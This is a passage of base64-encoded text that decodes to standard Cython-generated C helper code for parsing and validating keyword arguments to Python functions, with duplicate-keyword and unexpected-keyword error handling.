CAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSkKewogICAgUHlPYmplY3QgKiogY29uc3QgKm5hbWUgPSBhcmduYW1lczsKICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykgewogICAgICAgIFB5T2JqZWN0ICprZXkgPSAqKm5hbWU7CiAgICAgICAgaW50IGZvdW5kID0gUHlEaWN0X0NvbnRhaW5zKGt3ZHMsIGtleSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kKSkgewogICAgICAgICAgICBpZiAoZm91bmQgPT0gMSkgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBuYW1lKys7CiAgICB9CiAgICByZXR1cm4gMDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CiNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChQeU9iamVjdCAqczEsIFB5T2JqZWN0ICpzMikgewogICAgaW50IGtpbmQ7CiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHMxKTsKICAgIGlmIChsZW4gIT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczIpKSByZXR1cm4gMDsKICAgIGtpbmQgPSBQeVVuaWNvZGVfS0lORChzMSk7CiAgICBpZiAoa2luZCAhPSBQeVVuaWNvZGVfS0lORChzMikpIHJldHVybiAwOwogICAgY29uc3Qgdm9pZCAqZGF0YTEgPSBQeVVuaWNvZGVfREFUQShzMSk7CiAgICBjb25zdCB2b2lkICpkYXRhMiA9IFB5VW5pY29kZV9EQVRBKHMyKTsKICAgIHJldHVybiAobWVtY21wKGRhdGExLCBkYXRhMiwgKHNpemVfdCkgbGVuICogKHNpemVfdCkga2luZCkgPT0gMCk7Cn0KI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX3N0cigKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTsKICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICBQeV9oYXNoX3Qga2V5X2hhc2ggPSAoKFB5QVNDSUlPYmplY3QqKWtleSktPmhhc2g7CiAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKSB7CiAgICAgICAga2V5X2hhc2ggPSBQeU9iamVjdF9IYXNoKGtleSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09IC0xKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICAjZW5kaWYKICAgIG5hbWUgPSBmaXJzdF9rd19hcmc7CiAgICB3aGlsZSAoKm5hbWUpIHsKICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7CiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICAgICBpZiAoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2ggJiYgX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpIHsKICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmIChQeVVuaWNvZGVfR0VUX0xFTkdUSChuYW1lX3N0cikgPT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoa2V5KSkKICAgICAgICAjZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIGludCBjbXAgPSBQeVVuaWNvZGVfQ29tcGFyZShuYW1lX3N0ciwga2V5KTsKICAgICAgICAgICAgaWYgKGNtcCA8IDAgJiYgdW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkOwogICAgICAgICAgICBpZiAoY21wID09IDApIHsKICAgICAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpOwogICAgICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgbmFtZSsrOwogICAgfQogICAgbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lOwogICAgICAgICNpZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgICAgICAgaWYgKHVubGlrZWx5KGtleV9oYXNoID09ICgoUHlBU0NJSU9iamVjdCopbmFtZV9zdHIpLT5oYXNoKSkgewogICAgICAgICAgICBpZiAoX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpCiAgICAgICAgICAgICAgICBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KG5hbWVfc3RyID09IGtleSkpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpOwogICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgZ290byBhcmdfcGFzc2VkX3R3aWNlOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBuYW1lKys7CiAgICB9CiAgICByZXR1cm4gMDsKYXJnX3Bhc3NlZF90d2ljZToKICAgIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpOwogICAgZ290byBiYWQ7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cigKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTsKICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSBnb3RvIGludmFsaWRfa2V5d29yZF90eXBlOwogICAgbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgIHdoaWxlICgqbmFtZSkgewogICAgICAgIGludCBjbXAgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woKipuYW1lLCBrZXksIFB5X0VRKTsKICAgICAgICBpZiAoY21wID09IDEpIHsKICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpOwogICAgICAgIGlmICh1bmxpa2VseShjbXAgIT0gMCkpIHsKICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgICAgIGVsc2UgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwphcmdfcGFzc2VkX3R3aWNlOgogICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKaW52YWxpZF9rZXl3b3JkX3R5cGU6CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMHMoKSBrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiLCBmdW5jdGlvbl9uYW1lKTsKICAgIGdvdG8gYmFkOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X01hdGNoS2V5d29yZEFyZygKICAgIFB5T2JqZWN0ICprZXksCiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLAogICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZywKICAgIHNpemVfdCAqaW5kZXhfZm91bmQsCiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKQp7CiAgICByZXR1cm4gbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KGtleSkpID8KICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpIDoKICAgICAgICBfX1B5eF9NYXRjaEtleXdvcmRBcmdfbm9zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSkKewogICAgUHlfc3NpemVfdCBwb3MgPSAwOwogICAgUHlPYmplY3QgKmtleSA9IE5VTEw7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGt3ZHMpOwogICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3ZHMsICZwb3MsICZrZXksIE5VTEwpKSB7CiAgICAgICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgICAgICB3aGlsZSAoKm5hbWUgJiYgKCoqbmFtZSAhPSBrZXkpKSBuYW1lKys7CiAgICAgICAgaWYgKCEqbmFtZSkgewogICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgUHlfSU5DUkVGKGtleSk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwOwogICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKICAgICAgICAgICAgaWYgKGNtcCAhPSAxKSB7CiAgICAgICAgICAgICAgICBpZiAoY21wID09IDApIHsKICAgICAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAgICAgICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50ICclVSciLAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9uYW1lLCBrZXkpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICB9CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgYXNzZXJ0KFB5RXJyX09jY3VycmVkKCkpOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWU7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJnczsKICAgIFB5X3NzaXplX3QgZXh0cmFjdGVkID0gMDsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgZGVmaW5lZChQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMpCiAgICBpZiAodW5saWtlbHkoIVB5QXJnX1ZhbGlkYXRlS2V5d29yZEFyZ3VtZW50cyhrd2RzKSkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lICYmIG51bV9rd2FyZ3MgPiBleHRyYWN0ZWQpIHsKICAgICAgICBQeU9iamVjdCAqIGtleSA9ICoqbmFtZTsKICAgICAgICBQeU9iamVjdCAqdmFsdWU7CiAgICAgICAgaW50IGZvdW5kID0gMDsKICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICAgICAgZm91bmQgPSBQeURpY3RfR2V0SXRlbVJlZihrd2RzLCBrZXksICZ2YWx1ZSk7CiAgICAgICAgI2Vsc2UKICAgICAgICB2YWx1ZSA9IFB5RGljdF9HZXRJdGVtV2l0aEVycm9yKGt3ZHMsIGtleSk7CiAgICAgICAgaWYgKHZhbHVlKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgIGZvdW5kID0gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICAgICAgZXh0cmFjdGVkKys7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIGlmIChudW1fa3dhcmdzID4gZXh0cmFjdGVkKSB7CiAgICAgICAgaWYgKGlnbm9yZV91bmtub3duX2t3YXJncykgewogICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfVmFsaWRhdGVEdXBsaWNhdGVQb3NBcmdzKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpID09IC0xKSkKICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIF9fUHl4X1JlamVjdFVua25vd25LZXl3b3JkKGt3ZHMsIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGZ1bmN0aW9uX25hbWUpOwogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkRGljdFRvRGljdCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSkKewogICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTsKICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzOwogICAgUHlfc3NpemVfdCBsZW47CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKQogICAgaWYgKHVubGlrZWx5KCFQeUFyZ19WYWxpZGF0ZUtleXdvcmRBcmd1bWVudHMoa3dkcykpKSByZXR1cm4gLTE7CiNlbmRpZgogICAgaWYgKFB5RGljdF9VcGRhdGUoa3dkczIsIGt3ZHMpIDwgMCkgZ290byBiYWQ7CiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lKSB7CiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTsKICAgICAgICBQeU9iamVjdCAqdmFsdWU7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBMiB8fCBkZWZpbmVkKFB5RGljdF9Qb3ApKQogICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9Qb3Aoa3dkczIsIGtleSwgJnZhbHVlKTsKICAgICAgICBpZiAoZm91bmQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkOwogICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTsKICAgICAgICB9CiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMyLCBrZXksICZ2YWx1ZSk7CiAgICAgICAgaWYgKGZvdW5kKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShmb3VuZCA8IDApKSBnb3RvIGJhZDsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfRGVsSXRlbShrd2RzMiwga2V5KSA8IDApKSBnb3RvIGJhZDsKICAgICAgICB9CiNlbHNlCiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgdmFsdWUgPSBfUHlEaWN0X1BvcChrd2RzMiwga2V5LCBrd2RzMik7CiAgICAjZWxzZQogICAgICAgIHZhbHVlID0gX19QeXhfQ2FsbFVuYm91bmRDTWV0aG9kMigmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AsIGt3ZHMyLCBrZXksIGt3ZHMyKTsKICAgICNlbmRpZgogICAgICAgIGlmICh2YWx1ZSA9PSBrd2RzMikgewogICAgICAgICAgICBQeV9ERUNSRUYodmFsdWUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGJhZDsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBuYW1lKys7CiAgICB9CiAgICBsZW4gPSBQeURpY3RfU2l6ZShrd2RzMik7CiAgICBpZiAobGVuID4gMCkgewogICAgICAgIHJldHVybiBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGxlbiA9PSAtMSkpIHsKICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0Kc3RhdGljIGludCBfX1B5eF9QYXJzZUtleXdvcmRzVHVwbGUoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMOwogICAgUHlPYmplY3QqKiBjb25zdCAqIG5hbWU7CiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJnczsKICAgIGZvciAoUHlfc3NpemVfdCBwb3MgPSAwOyBwb3MgPCBudW1fa3dhcmdzOyBwb3MrKykgewojaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBrZXkgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oa3dkcywgcG9zKTsKI2Vsc2UKICAgICAgICBrZXkgPSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKGt3ZHMsIHBvcyk7CiNlbmRpZgojaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIGdvdG8gYmFkOwojZW5kaWYKICAgICAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKzsKICAgICAgICBpZiAoKm5hbWUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTsKICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gX19QeXhfTmV3UmVmKHZhbHVlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwOwogICAgICAgICAgICBpbnQgY21wID0gX19QeXhfTWF0Y2hLZXl3b3JkQXJnKGtleSwgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgJmluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKICAgICAgICAgICAgaWYgKGNtcCA9PSAxKSB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICAgICAgdmFsdWVzW2luZGV4X2ZvdW5kXSA9IF9fUHl4X05ld1JlZih2YWx1ZSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7CiAgICAgICAgICAgICAgICBpZiAoa3dkczIpIHsKICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShrd2RzMiwga2V5LCB2YWx1ZSkpKSBnb3RvIGJhZDsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoIWlnbm9yZV91bmtub3duX2t3YXJncykgewogICAgICAgICAgICAgICAgICAgIGdvdG8gaW52YWxpZF9rZXl3b3JkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgIGtleSA9IE5VTEw7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgICByZXR1cm4gMDsKaW52YWxpZF9rZXl3b3JkOgogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50ICclVSciLAogICAgICAgIGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKYmFkOgogICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBQeV9YREVDUkVGKGtleSk7CiAgICAjZW5kaWYKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZHMoCiAgICBQeU9iamVjdCAqa3dkcywKICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICprd2RzMiwKICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSwKICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLAogICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLAogICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSwKICAgIGludCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpCnsKICAgIGlmIChDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBsaWtlbHkoUHlUdXBsZV9DaGVjayhrd2RzKSkpCiAgICAgICAgcmV0dXJuIF9fUHl4X1BhcnNlS2V5d29yZHNUdXBsZShrd2RzLCBrd3ZhbHVlcywgYXJnbmFtZXMsIGt3ZHMyLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTsKICAgIGVsc2UgaWYgKGt3ZHMyKQogICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0VG9EaWN0KGt3ZHMsIGFyZ25hbWVzLCBrd2RzMiwgdmFsdWVzLCBudW1fcG9zX2FyZ3MsIGZ1bmN0aW9uX25hbWUpOwogICAgZWxzZQogICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0KGt3ZHMsIGFyZ25hbWVzLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTsKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKAogICAgY29uc3QgY2hhciogZnVuY19uYW1lLAogICAgaW50IGV4YWN0LAogICAgUHlfc3NpemVfdCBudW1fbWluLAogICAgUHlfc3NpemVfdCBudW1fbWF4LAogICAgUHlfc3NpemVfdCBudW1fZm91bmQpCnsKICAgIFB5X3NzaXplX3QgbnVtX2V4cGVjdGVkOwogICAgY29uc3QgY2hhciAqbW9yZV9vcl9sZXNzOwogICAgaWYgKG51bV9mb3VuZCA8IG51bV9taW4pIHsKICAgICAgICBudW1fZXhwZWN0ZWQgPSBudW1fbWluOwogICAgICAgIG1vcmVfb3JfbGVzcyA9ICJhdCBsZWFzdCI7CiAgICB9IGVsc2UgewogICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9tYXg7CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IG1vc3QiOwogICAgfQogICAgaWYgKGV4YWN0KSB7CiAgICAgICAgbW9yZV9vcl9sZXNzID0gImV4YWN0bHkiOwogICAgfQogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAiJS4yMDBzKCkgdGFrZXMgJS44cyAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgcG9zaXRpb25hbCBhcmd1bWVudCUuM